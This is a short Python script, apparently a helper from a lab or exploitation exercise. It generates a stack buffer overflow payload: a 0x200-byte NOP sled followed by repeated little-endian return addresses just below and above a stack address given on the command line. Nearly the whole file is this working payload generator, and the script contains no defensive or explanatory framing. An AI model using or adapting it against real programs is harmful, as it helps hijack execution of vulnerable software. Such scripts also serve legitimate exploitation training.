# You can use argparse :)
import sys

MAX_STACK_OFFSET = 0x100


def main():
    if len(sys.argv) < 3:
        sys.stderr.write("Usage: <prog> <stack-address> <max-offset>")
        sys.exit(1)

    stack_address = int(sys.argv[1], 0x10)
    max_offset = int(sys.argv[2])

    # You don't have to check for stack address validity
    if stack_address > 0xFFFFFFF0 or stack_address < 0:
        raise Exception("Stack address is invalid")

    if max_offset < 0 or max_offset > MAX_STACK_OFFSET:
        raise Exception("Can not generate payload for given offset")

    print(hex(stack_address), max_offset)
    min_stack_address = (stack_address-max_offset).to_bytes(4, "little")
    max_stack_address = (stack_address+max_offset).to_bytes(4, "little")
    nop = b"\x90"
    sys.stdout.buffer.write(nop * 0x200 + min_stack_address *
                            0x100 + max_stack_address * 0x100)


if __name__ == '__main__':
    main()
